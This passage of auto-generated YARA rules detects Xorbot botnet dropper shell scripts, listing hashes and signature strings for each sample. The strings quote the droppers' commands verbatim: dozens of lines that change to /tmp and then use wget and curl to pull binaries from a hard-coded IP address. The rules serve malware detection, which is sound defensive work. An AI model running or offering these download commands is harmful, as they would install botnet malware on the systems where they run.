      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/PurF6a03DSSz0SaCoi7QjDeFyej4uKkphe; curl -" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/2QWQhCcSvSs3vPiIkgAlDGtNBtBy6EmQmL; curl -" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/kW283NMYTWv70vqy6NCUoltUT9AIMYZ4cY; curl -" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/pCiCH1Dlctj7wpQnrA0GoPvBIYsh5RQsy2; curl -" ascii /* score: '30.00'*/
      $s14 = "wget http://178.16.54.252/bins/PurF6a03DSSz0SaCoi7QjDeFyej4uKkphe; curl -O  http://178.16.54.252/bins/PurF6a03DSSz0SaCoi7QjDeFye" ascii /* score: '27.00'*/
      $s15 = "wget http://178.16.54.252/bins/5S7izUbTYkigJ9lr2DeXIvB9TtZIoDMkOv; curl -O  http://178.16.54.252/bins/5S7izUbTYkigJ9lr2DeXIvB9Tt" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 30KB and
      8 of them
}

rule Xorbot_signature__8da949a7 {
   meta:
      description = "_subset_batch - file Xorbot(signature)_8da949a7.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8da949a73fba36add026f2500e7cced648de9f16f3d9a9244c1aae33efd7c2f9"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/pcdP7Ts47rz63FQlWZdgcclTHCO4bqio0J; curl -" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/Y5GUzi7UQdKPzw08KJ5PGZM4bx6A5T9wH6; curl -" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/Gk1avcrAKGLYJzRS7ow2lAQXVu5kVYv9N3; curl -" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/EFFCqbnLYTgYgUDHm2VQ7JxGUYtxtAUAry; curl -" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/ex5F1JouvPg8iZizHVQeCFczNkl5J9WhAs; curl -" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/eKwMYgJWOU4LL9x6SGFdOuR0fDmGWWfYUa; curl -" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/08dLQ5coN7USWiXdZ2CcyZx4bOL2E3VNaO; curl -" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/pTbQzXBQEciQmEwwK4JFQ1l2TOp1F6kZ5H; curl -" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/gd2Ghmn2eqz4ghrgeV7GylH9O9OXCyQpfm; curl -" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/A1ifIn4SR8apaFhFPhk2GnLuKkamrnLoJU; curl -" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/xzYXsWlTXxGetOqUPWt4p89rWk95Ri7rWb; curl -" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/x82kPZz6IXLTKN5V8P7Y8chcSp4MeZ9qme; curl -" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/XDRecs2rin9lhlbQTfn5ZxAN0uvAIDGhs4; curl -" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/25Nxt1baCdFX2HKNDuK6LULMvMBisTUJlc; curl -" ascii /* score: '30.00'*/
      $s15 = "wget http://178.16.54.252/bins/25Nxt1baCdFX2HKNDuK6LULMvMBisTUJlc; curl -O  http://178.16.54.252/bins/25Nxt1baCdFX2HKNDuK6LULMvM" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 30KB and
      8 of them
}

rule Xorbot_signature__90cc25bc {
   meta:
      description = "_subset_batch - file Xorbot(signature)_90cc25bc.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "90cc25bcdeb9b03242d99913e51ef5e8b11fdfaae1205cabc85147685229c186"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/WiJzq7Tumn2LwAeAX59frpBETdZjobqw5J; curl -" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/C59QY8Rv2AMSKVpS3DD0bs3Dy0LYJzzWiX; curl -" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/Rwo2ssPwk2cNidF3xgh3JPpKiSYUPEaB14; curl -" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/9dFsdlWK2zMpobZOm0u2IX4m0S6wHJLjUB; curl -" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/eg8KvWqZsMaYLTu3aLpfzX1OIuzZi2VU32; curl -" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/SeAmmtw6U5iKb92YwfHqrkHCXuieEqC65U; curl -" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/XnkWSAOiAXN3pUd70jML8WDXphHDFh3FBz; curl -" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/MHATFt1MtUCwCpaKXYMMXdY7DLHZytdgib; curl -" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/nWp56AeTjiOfnW3g5K2TkWmlnGEDblQOSn; curl -" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/rfpsvroGnWDnbAgO6tOnYvWWDcPkpmYp76; curl -" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/nXn2wqi6u6uTVtQVbzAuMb6kEeh2xC9nEw; curl -" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/33PPRgbGPeXdWg3rVNukSzHM381j6zHj3W; curl -" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/goTb7RpzoC05GBCxHZui8WsxFiW382RfCD; curl -" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/0vmopBuGXvLxNUNe6pVZMSu1cMUshIqGgE; curl -" ascii /* score: '30.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/rfpsvroGnWDnbAgO6tOnYvWWDcPkpmYp76; curl -" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 30KB and
      8 of them
}

rule Xorbot_signature__9665c13e {
   meta:
      description = "_subset_batch - file Xorbot(signature)_9665c13e.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9665c13e8d6a8a9aa44950e594c79979fa90dc8e1b8f403128effdafd362bd3c"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/ur7X9ufM2vIsTMZ4WIv28dz0jJTLoStVnb; curl -" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/oZcWYpczQILTSxC2NfK9ih0wbh9FvUcM8G; curl -" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/IEb1WPTL54UxFVC95Pcz7gQNow47ahhOkf; curl -" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/UIbDZoJuuhZtQ7EWVRPm47U2KVDwtKWxUH; curl -" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/oIbkmcnHeWSrQ3ffVj0RlHNlDmyaWncoSb; curl -" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/xmkLmITCDOGcmydzBUt3qMaWocbRz2phk2; curl -" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/8NOzQ8CDH1FBLrORlAToQYixfoV0TwvXTr; curl -" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/ehVaeslbLXOJIPHxCJEDTQnGHwTqBApjmB; curl -" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/GA04WEYFWSMhSjbbLMf0jGQk2nE2LmEoxw; curl -" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/JCXk4zie4EiNtjdSuLzWn2MaWRIHdSOrsr; curl -" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/LEWZdZnaZdVLp7yGm7BE1LcYzh11txHdUu; curl -" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/bM17DyUjNTGGKsWO5fmO2PgMflGGYRlPix; curl -" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/RffcddUxuZycVSsYGirE17fjaRRuuUVyJ9; curl -" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/ZrK3K7qWY5sVVPaj6pmo7aBZar0L4b5GFz; curl -" ascii /* score: '30.00'*/
      $s15 = "wget http://178.16.54.252/bins/LEWZdZnaZdVLp7yGm7BE1LcYzh11txHdUu; curl -O  http://178.16.54.252/bins/LEWZdZnaZdVLp7yGm7BE1LcYzh" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 30KB and
      8 of them
}

rule Xorbot_signature__a8795ed6 {
   meta:
      description = "_subset_batch - file Xorbot(signature)_a8795ed6.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a8795ed612a2591c9f42a7531e4859f26ad52baae101d3a4880590aebdb370cc"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/sxDjBEz72jjvuWyZGVoD4n2y2bL9lurCiy; curl -" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/U8HENXOF3VqStdk4z8xhVpqxrPUsjLqAWD; curl -" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/uEAqMicPVa83l408cHIfaBRhQo4q6AeIiw; curl -" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/durcZr91Ua8esFp5gxvNOkVJvGjP1CUYXt; curl -" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/fkict5LhldtnhfmTR6myHl3tI6fxLKRDwb; curl -" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/sI0o8IfaWvo6ROHUvE03nJ208YonZSZBlx; curl -" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/vrvHThMZirxrF14EZ0qQkyHk45zuKysZxP; curl -" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/2KiKpNuRUb1gm1mgwu21Gqr5ncsbzIQ4xY; curl -" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/TCG7BqQ6hUv6TShpzLU95aIMpaDs8yjyzU; curl -" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/bXNJOmEsEsO6e0YSblRUYDf8Z5DaB0qaxX; curl -" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/3jKdJHmMqQIFogeab5eSgc4rjqpHLqUnzF; curl -" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/sV6RS0Hfp6EDSKshG9TAH8dT9yG47KPSSU; curl -" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/L6BNUtoBkwNvFxmq7QBal2QTebej4F5H12; curl -" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/3jKdJHmMqQIFogeab5eSgc4rjqpHLqUnzF; curl -" ascii /* score: '27.00'*/
      $s15 = "wget http://178.16.54.252/bins/bXNJOmEsEsO6e0YSblRUYDf8Z5DaB0qaxX; curl -O  http://178.16.54.252/bins/bXNJOmEsEsO6e0YSblRUYDf8Z5" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 30KB and
      8 of them
}

rule Xorbot_signature__ac1f59f8 {
   meta:
      description = "_subset_batch - file Xorbot(signature)_ac1f59f8.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ac1f59f8b2214b8e3e16513e4b897194f18ce5107c4cfa90fc2de71c3d34ded9"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/qLvU4l2luJH8pS6qNzIcPE96rrZKQilEvL; curl -" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/UZBixbPCvYMjoFUzU1YDdMHiLhveNVqEzm; curl -" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/VsrrSb74RWBX7mWDa5j5SEh0MFohdwDYfr; curl -" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/JMDXwo5ZjqyZfBFzBhFtrEo2DLWS0EwlOr; curl -" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/XYZRPiImOZ4rHymEgqt4eQxx70HWbBX3aN; curl -" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/aI8BCjxHHsll8kJL8T3gNt47WDaV8TLB5J; curl -" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/SnpGy0Isg7K7qXPnggJuYhEGETwQzb10x5; curl -" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/TieuRVhHojFL3VQG3auLntmagnQPEirRU2; curl -" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/293e1TPxuvovXG1uM9KficoD7LPAQS35hh; curl -" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/WPTPLDrpkXutKqZous0cSmfClMw3tZU8HT; curl -" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/h0SZqdNnHvLrLhgV7fP4rzdWfzCfkrV2qS; curl -" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/kFNAqlkHo84pK8n4jNa2hPFi3worWLNRTH; curl -" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/LFZCldny7letxyGSEbX72ZoMfernPrCu2m; curl -" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/SnpGy0Isg7K7qXPnggJuYhEGETwQzb10x5; curl -" ascii /* score: '27.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/aI8BCjxHHsll8kJL8T3gNt47WDaV8TLB5J; curl -" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 30KB and
      8 of them
}

rule Xorbot_signature__ae65bbdb {
   meta:
      description = "_subset_batch - file Xorbot(signature)_ae65bbdb.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ae65bbdb54637e4526470f499a178f36f786eca3c439a5267a9c9c7bb4998d5b"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/B9Kn2Ok5Fd8JMODi0nRz79my2TUTRhbVpr; curl -" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/X3icwQyUZBIXbdEGTkj1nWsQNArSYQ0Aq4; curl -" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/PrRq052vtOiAKjoHHzUkY9XrVooQDIfIrw; curl -" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/Fha1lFhsV7IXqIfjtziDpsomVwio3OjQPp; curl -" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/goJpkmABXqXbUMNi8TjMAUoaBy7jH80lmV; curl -" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/MmQyZAmzQXZ4gBxF8Jgqkioc6mQgfdaqrB; curl -" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/kzeJut2nRwkaYQ0UI4z1hJGWRKdapk1Es5; curl -" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/uFEnlYwV3YqcfwUlUqtQSGKx5DTArjU3UU; curl -" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/CN6Wra98mVbOkJpjEVt973HShn1Njqu4M2; curl -" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/I1Flm6Js0bfti0PILuyvHuxCpElRyjwHUb; curl -" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/Z5r4Bc0w8rJnhVGbMCV069Sg5xcT5WyK1L; curl -" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/6ueyGnwcPQd4ME7U7ZIR8mf2WNy46cDUC7; curl -" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/bmTIVuNzMNGhTJmZotEe6rxNAGpFcEll3k; curl -" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/kzeJut2nRwkaYQ0UI4z1hJGWRKdapk1Es5; curl -" ascii /* score: '27.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/Fha1lFhsV7IXqIfjtziDpsomVwio3OjQPp; curl -" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 30KB and
      8 of them
}

rule Xorbot_signature__b1ae7e86 {
   meta:
      description = "_subset_batch - file Xorbot(signature)_b1ae7e86.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b1ae7e86241518fdb66a0783c23195f14e01a7ab3a6cd06a9106b58ae98cb4d1"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/GRkBVxgg8H6boOOXhGNlq9KQjmtq1BvNmG; curl -" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/zs34jzB6rRZIj275vTVFW6kOXVNWGczjQt; curl -" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/pVsxspNIcOZswCV6q7Lace2HAmu5xvfqP9; curl -" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/YQ2JezXO54mcMyXk72D6n85Q4ec7yRmteH; curl -" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/3FNFakfPV2dzJPbidxqYjZ2xhDycfT1a6Z; curl -" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/Z7cpWTk2jrriG73PIPJO5zl8oEzzd20XX7; curl -" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/CkRcQ09FKU9Eajv6l8f4eDn8dBJnCqtyzQ; curl -" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/cWtDAXA6nzmA5oMF1BFUwTz0b2jTXz0Ojf; curl -" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/Y8Dm6YklI1BBzlhYDlY58a3WqcNsRqO9fd; curl -" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/RxuU8P8tLhIZlbpqABz9Q7qy0mUsSLXPLx; curl -" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/UOdTGuKkrUKqstrGOggWJTGJdAYOYFr65F; curl -" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/3GclPbvGH2Uie9HUKEh0kSq7k6SDmz6o5f; curl -" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/DA7hF0ANTpUXz7e14N75IBIDSt9maGCMDr; curl -" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/BpBoP8zHqfKgtswxpgI5Tw7W8JyOuuJSKc; curl -" ascii /* score: '30.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/Y8Dm6YklI1BBzlhYDlY58a3WqcNsRqO9fd; curl -" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 30KB and
      8 of them
}

rule Xorbot_signature__b3fc634c {
   meta:
      description = "_subset_batch - file Xorbot(signature)_b3fc634c.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b3fc634c9418e1ca5fc434114e50a113c40d69eeb9f9011b0d74d138d54765ea"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/wmkY9k463UXHOEPUoRLkvjB2Zry3ekCr3H; curl -" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/aHvXAZid68bGs0wtEpcNlg7JllvvMkkWg1; curl -" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/uaWqyCsC3maAoBmE85TzS3zLvAH3tOmQZg; curl -" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/qICU0Z0hIGcNENjJZDPcqUTDVvt0B89ReO; curl -" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/WYBQpfaGCv7fy6EYiQeeIOVS1U9yRaaR4Y; curl -" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/Wk3zcZkRlGL9niINN1o0867BSYVS7pNsnN; curl -" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/hq0AfLxwuLX2CwZGIsUmvQqkarp1JFNtEA; curl -" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/24eGkCBZPxaWeCfXUy2XvSFFfxvGmSRVvo; curl -" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/TEwBHqe4UnkfbvTKr8GrijU64I5VzIajRo; curl -" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/eV5aPIUkszFrqn3CsoLz5fL4B35yu82Y0g; curl -" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/2gc5TB907LwAbI0nue5IifuwGjO9Yv3wh3; curl -" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/7skn3uexJ9urOZItwIOP61TzFpOqabHnyo; curl -" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/x5FU16hvBeksO2O7Zuwi9WT09lF5VrkPwc; curl -" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/OBQkaPeTgxLWvXEpGgwx0oyDhDVQTuLAci; curl -" ascii /* score: '30.00'*/
      $s15 = "wget http://178.16.54.252/bins/WYBQpfaGCv7fy6EYiQeeIOVS1U9yRaaR4Y; curl -O  http://178.16.54.252/bins/WYBQpfaGCv7fy6EYiQeeIOVS1U" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 30KB and
      8 of them
}

rule Xorbot_signature__b5b01382 {
   meta:
      description = "_subset_batch - file Xorbot(signature)_b5b01382.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b5b013823acdf722ec58452886abac63979f7d8f8fa8c351299b10a0a8ae5ca2"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.54.252/bins/PRI1JTkEvlYVDoIqG5QYvSkFN7Xg3btHWd; curl -" ascii /* score: '30.00'*/
